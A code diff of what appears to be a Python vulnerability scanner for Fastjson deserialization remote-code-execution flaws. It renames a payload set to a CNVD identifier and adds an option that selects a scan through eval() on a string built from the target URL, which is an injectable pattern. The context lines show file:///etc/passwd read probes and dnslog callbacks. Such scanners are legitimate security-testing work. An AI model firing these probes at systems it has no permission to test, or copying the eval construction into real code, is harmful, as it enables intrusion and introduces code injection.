@@ -6,6 +6,7 @@
         Fastjson <=1.2.47 反序列化 (远程代码执行)
             CNVD-2019-22238
         Fastjson <= 1.2.24 反序列化 (远程代码执行)
+            CNVD-2017-02833
             CVE-2017-18349
 file:///etc/passwd
 file:///C:\Windows\System32\drivers\etc\hosts
@@ -47,7 +48,7 @@ class Fastjson():
             }
         ]
 
-        self.cve_2017_18349_payloads = [
+        self.cnvd_2017_02833_payloads = [
             {
                 'path': '',
                 'data': '''{
@@ -123,7 +124,7 @@ class Fastjson():
                 }
                 return results
 
-    def cve_2017_18349_scan(self, url):
+    def cnvd_2017_02833_scan(self, url):
         ''' fastjson <= 1.2.24 反序列化漏洞'''
         url = url.rstrip('/')
         sessid = '7d5ff4518944d45f35d9850f3d9be254'
@@ -139,7 +140,7 @@ class Fastjson():
         headers = self.headers.copy()                               # * 复制一份headers, 防止污染全局headers
         headers.update(vul_info['headers'])                         # * 合并Headers
 
-        for payload in self.cve_2017_18349_payloads:                # * Payload
+        for payload in self.cnvd_2017_02833_payloads:                # * Payload
             md = random_md5()                                       # * 随机md5值, 8位
             dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名
 
@@ -185,10 +186,13 @@ class Fastjson():
                 }
                 return results
 
-    def addscan(self, url):
+    def addscan(self, url, vuln=None):
+        if vuln:
+            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))
+
         return [
             thread(target=self.cnvd_2019_22238_scan, url=url),
-            thread(target=self.cve_2017_18349_scan, url=url)
+            thread(target=self.cnvd_2017_02833_scan, url=url)
         ]
 
 fastjson = Fastjson()
